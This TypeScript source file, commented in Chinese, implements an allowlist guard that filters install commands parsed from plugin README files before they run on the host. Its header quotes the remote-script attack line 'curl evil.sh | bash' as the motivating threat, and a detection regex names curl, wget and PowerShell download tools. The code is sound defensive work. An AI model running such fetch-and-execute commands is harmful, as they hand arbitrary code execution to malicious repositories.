/**
 * T0 直装命令白名单（issue #165 安全修复）。
 *
 * 背景：T0 直装在宿主进程以用户全部权限执行 README/配方解析出的命令
 * （Win32 cmd /d /s /c，POSIX sh -c，无沙箱）。此前任意命令原样执行——
 * 一个恶意仓库在 README 写一句 `curl evil.sh | bash` 即可完成
 * 「市场点击 → 任意代码执行」，且 ruflo 事故中实际发生了。
 *
 * 这里用「白名单」而非「黑名单」：只放行结构受限、可预期的命令形态，
 * 其余一律拒绝直装（needAi 升级 T1 复核，或转人工/安全模式）。
 *
 * #320 补充：guardInstallCommands（整批判定，用于已确认命令的受控执行）之外，
 * 提供 filterInstallCommands（逐条过滤：丢弃非法命令、保留合法子集）——
 * README 混合命令批（合法 add + 越权 update）不再整批连坐。
 *
 * 放行形态：
 * - `dsh plugin [--profile <p>] add <pkg>`           官方安装命令（与内置路径同款）
 * - `git clone https://github.com/<owner>/<repo>`    仅限插件自身仓库；目标不允许 ~ 与 ..，
 *                                                    绝对路径仅允许目标技能目录（规范化改写产物）
 * - `npm install|i <pkg>` / `pnpm add|install <pkg>` 非全局；包名仅限 registry 形态（拒 URL/git 源/路径）
 */
import type { DshPlugin } from "@dsh-market/schema";

export interface BlockedCommand {
  command: string;
  reason: string;
}

export interface GuardResult {
  ok: boolean;
  blocked: BlockedCommand[];
}

export interface GuardOptions {
  /** 允许的绝对路径前缀（git clone 目标）：传 cfg.skillsDir，规范化改写后的克隆目标才可放行 */
  allowedDestPrefix?: string;
}

/** shell 结构性操作符：管道 / 链式 / 后台 / 重定向 / 命令替换 / 换行（白名单形态用不到它们，出现即拒） */
const SHELL_OPERATOR_RE = /[|;&`<>]|\$\(|\r?\n/i;

/** 远端脚本执行信号（用于给出更可读的拒绝原因；命中白名单前就被操作符规则拦下，这里兜底可读性） */
const REMOTE_EXEC_RE =
  /\b(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|invoke-expression|iex)\b/i;

function isGlobalFlag(token: string): boolean {
  const t = token.toLowerCase();
  return t === "-g" || t === "--global" || t === "global";
}

/** registry 包名形态：拒协议源（https/git+/github:/file: 等）、路径（~ / 盘符 / 根）、.. 穿越 */
function isRegistryPkg(token: string): boolean {
  if (/^(https?:|git\+|github:|gitlab:|bitbucket:|file:|link:|workspace:)/i.test(token)) return false;
  if (/^~/.test(token)) return false;
  if (/^([a-z]:)?[\\/]/i.test(token)) return false;
  if (token.includes("..")) return false;
  return true;
}

/** 归一化路径用于前缀比较（Windows 大小写不敏感、分隔符统一） */
function normPath(p: string): string {
  return p.replace(/\//g, "\\").toLowerCase().replace(/\\+$/, "");
}

export function guardInstallCommands(
  plugin: Pick<DshPlugin, "fullName">,
  commands: string[],
  opts?: GuardOptions,
): GuardResult {
  const blocked: BlockedCommand[] = [];
  for (const command of commands) {
    const reason = checkInstallCommand(plugin, command, opts);
    if (reason !== null) blocked.push({ command, reason });
  }
  return { ok: blocked.length === 0, blocked };
}

export interface FilterResult {
  /** 通过白名单的命令子集（可安全执行） */
  pass: string[];
  /** 未通过而被丢弃的命令（不执行，原因随行） */
  dropped: BlockedCommand[];
}

/**
 * 逐条过滤（issue #320）：白名单外命令**丢弃而非整批拒绝**。
 * 安全语义不变——丢弃 = 不执行，严格 safer；收益是 README 常见的
 * 混合命令批（合法 add + 越权的 update/uninstall 等）不再连坐，
 * 合法子集可直接零 token 直装，避免无谓升级 T1。
 * 全部被丢 → pass 为空，调用方按原语义升级 T1（reason 带丢弃明细）。
 */
export function filterInstallCommands(
  plugin: Pick<DshPlugin, "fullName">,
  commands: string[],
  opts?: GuardOptions,
): FilterResult {
  const pass: string[] = [];
  const dropped: BlockedCommand[] = [];
  for (const command of commands) {
    const reason = checkInstallCommand(plugin, command, opts);
    if (reason === null) pass.push(command);
    else dropped.push({ command, reason });
  }
  return { pass, dropped };
}

/** 单条命令白名单校验：null = 放行；否则返回人话拒绝原因 */
function checkInstallCommand(
  plugin: Pick<DshPlugin, "fullName">,
  raw: string,
  opts?: GuardOptions,
): string | null {
  const command = raw.trim();

  if (!command) return "空命令";
  if (SHELL_OPERATOR_RE.test(command)) {
    return REMOTE_EXEC_RE.test(command)
      ? "包含远程脚本下载执行（curl/wget 管道 bash 等），已阻止直装"
      : "包含管道/链式/重定向等 shell 操作符";
  }

  const tokens = command.split(/\s+/).filter(Boolean);
  const head = (tokens[0] ?? "").toLowerCase();

  if (head === "dsh") {
    if (
      (tokens[1] ?? "").toLowerCase() === "plugin" &&
      tokens.some((t) => /^(add|install)$/i.test(t))
    ) {
      return null;
    }
    return "dsh 命令仅放行「dsh plugin ... add <pkg>」形态";
  }

  if (head === "git") {
    const urlIdx = tokens.findIndex((t, i) => i >= 2 && /^https:\/\/github\.com\//i.test(t));
    const url = urlIdx > 0 ? tokens[urlIdx] : "";
    const m = url.match(/^https:\/\/github\.com\/([\w.-]+)\/([\w.-]+?)(?:\.git)?$/i);
    const own =
      m !== null && `${m[1]}/${m[2]}`.toLowerCase() === plugin.fullName.toLowerCase();
    if ((tokens[1] ?? "").toLowerCase() !== "clone" || !own) {
      return "git 仅放行克隆插件自身 GitHub 仓库";
    }
    const dest = tokens.length > urlIdx + 1 ? tokens[tokens.length - 1] : "";
    if (dest) {
      const destBad =
        dest.startsWith("~") ||
        dest.includes("..") ||
        (/^([a-z]:)?[\\/]/i.test(dest) &&
          !(opts?.allowedDestPrefix && normPath(dest).startsWith(normPath(opts.allowedDestPrefix))));
      if (destBad) {
        return "git clone 目标目录越界（~ / .. / 非技能目录的绝对路径）";
      }
    }
    return null;
  }

  if (head === "npm" || head === "pnpm") {
    const sub = (tokens[1] ?? "").toLowerCase();
    if (!["install", "i", "add"].includes(sub)) {
      return `${head} 仅放行 install/i/add 形态`;
    }
    if (tokens.some(isGlobalFlag)) {
      return "全局安装（-g/--global）已阻止：插件应装进 profile 或技能目录";
    }
    const pkgs = tokens.slice(2).filter((t) => !t.startsWith("-"));
    if (pkgs.length === 0) {
      return "缺少包名";
    }
    if (!pkgs.every(isRegistryPkg)) {
      return "包名含 URL/git 源/路径形态，已阻止（仅放行 registry 包名）";
    }
    return null;
  }

  return "非白名单命令形态";
}
